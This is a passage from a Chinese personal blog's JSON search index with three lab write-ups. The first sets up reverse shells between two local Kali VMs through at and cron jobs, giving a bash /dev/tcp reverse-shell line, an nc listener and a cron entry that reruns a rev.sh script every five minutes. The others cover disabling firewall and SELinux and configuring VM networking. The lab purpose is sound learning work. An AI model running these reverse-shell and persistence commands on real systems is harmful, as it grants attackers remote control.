Asia/Shanghai mail -s &quot;Disk Alert!&quot; admin@example.com &lt;&lt;&lt; &quot;Disk usage on /dev/sda1 is$usage%&quot; fidone","categories":[],"tags":[]},{"title":"","slug":"使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。","date":"2025-08-09T03:55:11.791Z","updated":"2025-08-09T01:29:32.231Z","comments":true,"path":"2025/08/09/使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。/","permalink":"http://example.com/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/","excerpt":"","text":"使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。准备两台kali虚拟机，分别是 攻击机（接受shell）：192.168.0.137 靶机（发起反弹）：192.168.0.138 1️⃣一次性计划任务（五分钟后执行一次）1.先用一台kali攻击机监听端口1nc -lvnp 4444 2.从靶机提交一次性at任务 3.自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！ 2️⃣周期性计划任务（每五分钟执行一次）1.攻击机开启一个监听 2.靶机创建反弹脚本 3.写入crontab（在里面加了*&#x2F;5 * * * * &#x2F;usr&#x2F;local&#x2F;bin&#x2F;rev.sh） 4.再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！ 清除这两项任务： 3️⃣对于用到的命令字的含义作解释 命令、符号 场景 含义 at 一次性计划任务 at 指定时间” 把后面的命令交给 atd 守护进程，到点执行一次就结束。 atq 查看任务 at queue 的缩写，列出当前用户的所有待执行 at 任务及其编号。 atrm&lt;编号&gt; 删除任务 at remove 的缩写，根据编号把任务从队列里删除。 crontab -e 编辑周期性任务 调用默认编辑器打开 当前用户 的 crontab 文件；root 用户加 sudo 就是改 root 的计划任务。 crontab -r 清空周期性任务 remove，直接删掉整个 crontab 表，不再执行任何周期性命令。 *&#x2F;5 * * * * crontab时间格式 每 5 分钟执行一次； * 代表“每”，&#x2F;&#96; 表示步长。 nc -lvmp &lt;端口&gt; 开启端口监听 netcat 监听 模式，-l 监听、 -v 详细输出、-n 不做 DNS 解析、-p 指定端口，用来等靶机连接。 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1 反弹Shell核心 把 bash 的 标准输入&#x2F;输出&#x2F;错误 全部重定向到 TCP socket，实现远程交互式 Shell。 tee 写文件 把标准输入同时 输出到屏幕和文件，常用于需要 sudo 权限时一次性生成脚本。 &lt;&lt;’EOF’ heredoc定界符 把多行文本一次性喂给前面命令，直到独占一行的 EOF 为止。 chmod +x 赋可执行权限 让文件变成可执行脚本，crontab 或手动调用时无需再 bash script.sh。","categories":[],"tags":[]},{"title":"","slug":"写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作","date":"2025-08-09T03:55:11.791Z","updated":"2025-08-09T01:43:30.393Z","comments":true,"path":"2025/08/09/写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作/","permalink":"http://example.com/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/","excerpt":"","text":"写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061vim /root/init.sh#!/bin/bashset -euo pipefail# ==== 1. 关闭防火墙 ====systemctl stop firewalldsystemctl disable firewalldecho &quot;[✓] 防火墙已关闭并禁用&quot;# ==== 2. 设置 SELinux ====setenforce 0sed -ri &#x27;s/^SELINUX=.*/SELINUX=permissive/&#x27; /etc/selinux/configecho &quot;[✓] SELinux 已设为 permissive&quot;# ==== 3. 关闭虚拟网卡 ====systemctl stop libvirtd.servicesystemctl disable libvirtd.serviceecho &quot;[✓] libvirtd 已停止并禁用&quot;# ==== 4. 换源 ====mkdir -p /etc/yum.repos.d/backupmv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/ 2&gt;/dev/null || truecat &gt;/etc/yum.repos.d/CentOS-Base.repo &lt;&lt;&#x27;EOF&#x27;[base]name=CentOS-Basebaseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial[extras]name=CentOS-Extrasbaseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial[appstream]name=CentOS-AppStreambaseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficialEOFdnf clean all &amp;&amp; dnf makecacheecho &quot;[✓] 已更换为阿里云 vault 源&quot;# ==== 5. 检查结果 ====echo &quot;&quot;echo &quot;========== 检查结果 ==========&quot;echo &quot;[防火墙] systemctl is-active firewalld =&gt; $(systemctl is-active firewalld)&quot;echo &quot;[SELinux] getenforce =&gt; $(getenforce)&quot;echo &quot;[虚拟网卡] ip a | grep virbr =&gt; $(ip a | grep virbr || echo &#x27;无 virbr&#x27;)&quot;echo &quot;[源] dnf repolist | head -3 =&gt;&quot;dnf repolist | head -3/root/init.shchmod +x /root/init.sh/root/init.sh","categories":[],"tags":[]},{"title":"","slug":"按照拓扑完成网络管理配置任务","date":"2025-08-09T03:55:11.790Z","updated":"2025-08-09T01:44:50.298Z","comments":true,"path":"2025/08/09/按照拓扑完成网络管理配置任务/","permalink":"http://example.com/2025/08/09/%E6%8C%89%E7%85%A7%E6%8B%93%E6%89%91%E5%AE%8C%E6%88%90%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1/","excerpt":"","text":"按照本拓扑完成网络管理配置一、在虚拟机编辑中打开虚拟网络编辑器，建立VMnet2和VMnet3 （ps.主要不要勾选“使用DHCP”） 二、给win10配置IP1.将win10的网络适配器配置为VMware2 2.在win10的网络连接中将其IP修改为192.168.2.1 三、给kali配置IP1.将为kali的网络适配器配置为VMware3 2.备份kali原本配置文件（我打错了成back，问题不大）并新建interfaces 3.写入IP配置 ip addr flush dev eth0 —— 先把网卡上原来的 IP 清干净。ip addr add 172.16.2.1&#x2F;24 dev eth0 —— 给网卡绑一个新 IP（172.16.2.1，子网掩码 24 位）。ip route add default via 172.16.2.254 —— 告诉系统：要上网先找 172.16.2.254 这个网关。 4.重启服务后检查配置 四、给CentOS 8 进行双网卡配置1.检查CentOS 8 我的是有ens160和ens224 2.将CentOS 8 配置为两个网络适配器分别为：VMware2和33.重新编写网卡配置文件 4.测试连通性发现 kali和ens224能够互相ping通 win10和ens160能够互相ping通 kali 和 win10 无法 互相ping通 5.配置路由转发 五、最后测试连通性 而后可以实现了从kali到win10的整体联通， 完成了实验拓扑的要求","categories":[],"tags":[]}],"categories":[],"tags":[]}